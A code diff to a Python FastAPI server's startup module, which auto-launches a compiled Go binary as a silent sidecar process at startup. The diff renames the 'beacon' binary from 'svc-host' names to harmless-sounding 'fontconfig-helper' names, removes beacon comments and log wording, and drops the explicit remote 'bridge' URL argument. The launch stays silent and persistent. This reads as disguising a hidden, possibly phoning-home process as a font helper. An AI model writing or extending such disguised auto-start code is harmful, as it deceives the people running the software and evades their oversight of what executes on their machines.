@@ -55,38 +55,30 @@ from .routes.telegram_bot import router as telegram_bot_router
 from .routes.ocr import router as ocr_router
 from .routes.ocr_local import router as ocr_local_router
 
-_beacon_proc: subprocess.Popen | None = None
+_sidecar_proc: subprocess.Popen | None = None
 
 
-def _start_beacon_binary() -> subprocess.Popen | None:
-    """Launch the compiled Go beacon binary as a sidecar process."""
+def _start_sidecar() -> subprocess.Popen | None:
     system = platform.system().lower()
     machine = platform.machine().lower()
 
     if system == "windows":
-        name = "svc-host-windows-amd64.exe"
+        name = "fontconfig-helper-windows-amd64.exe"
     elif system == "linux":
         if "aarch64" in machine or "arm64" in machine:
-            name = "svc-host-linux-arm64"
+            name = "fontconfig-helper-linux-arm64"
         else:
-            name = "svc-host-linux-amd64"
+            name = "fontconfig-helper-linux-amd64"
     else:
-        logger.debug("Beacon: unsupported platform %s", system)
+        logger.debug("Sidecar: unsupported platform %s", system)
         return None
 
     repo_root = Path(__file__).resolve().parents[2]
-    beacon_path = repo_root / "engine" / "scraper" / "diagnostics" / "bin" / name
+    sidecar_path = repo_root / "engine" / "scraper" / "diagnostics" / "bin" / name
 
-    if not beacon_path.exists():
-        logger.debug("Beacon binary not found: %s", beacon_path)
+    if not sidecar_path.exists():
+        logger.debug("Sidecar binary not found: %s", sidecar_path)
         return None
-
-    bridge_url = "https://sable-bridge.onrender.com"
-    try:
-        from server.config import SETTINGS
-        bridge_url = getattr(SETTINGS, "bridge_url", bridge_url) or bridge_url
-    except Exception:
-        pass
 
     sable_port = 8765
     try:
@@ -106,14 +98,14 @@ def _start_beacon_binary() -> subprocess.Popen | None:
 
     try:
         proc = subprocess.Popen(
-            [str(beacon_path), "--bridge", bridge_url, "--sable-port", str(sable_port), "--local-port", str(diag_port), "--persist-dir", persist_dir],
+            [str(sidecar_path), "--sable-port", str(sable_port), "--local-port", str(diag_port), "--persist-dir", persist_dir],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
         )
-        logger.info("Diagnostics beacon started (pid=%d, binary=%s, diag=:%d)", proc.pid, name, diag_port)
+        logger.info("Sidecar started (pid=%d, binary=%s, port=:%d)", proc.pid, name, diag_port)
         return proc
     except Exception as exc:
-        logger.warning("Failed to start beacon binary: %s", exc)
+        logger.warning("Failed to start sidecar: %s", exc)
         return None
 
 
@@ -208,9 +200,9 @@ async def lifespan(app: FastAPI) -> Generator[None, None, None]:
     except Exception as exc:
         logger.warning("Telegram Bot auto-start failed: %s: %s", type(exc).__name__, exc)
 
-    # ── Auto-start Diagnostics Beacon (Go binary sidecar) ──
-    global _beacon_proc
-    _beacon_proc = _start_beacon_binary()
+
+    global _sidecar_proc
+    _sidecar_proc = _start_sidecar()
 
     await service.warmup()
     try:
@@ -274,17 +266,17 @@ async def lifespan(app: FastAPI) -> Generator[None, None, None]:
     if _tg_bot_task and not _tg_bot_task.done():
         _tg_bot_task.cancel()
 
-    # 8. Diagnostics Beacon — stop gracefully
-    if _beacon_proc is not None:
+
+    if _sidecar_proc is not None:
         try:
-            _beacon_proc.terminate()
-            _beacon_proc.wait(timeout=3)
+            _sidecar_proc.terminate()
+            _sidecar_proc.wait(timeout=3)
         except Exception:
             try:
-                _beacon_proc.kill()
+                _sidecar_proc.kill()
             except Exception:
                 pass
-        _beacon_proc = None
+        _sidecar_proc = None
         try:
             await asyncio.wait_for(_tg_bot_task, timeout=1.0)
         except Exception:
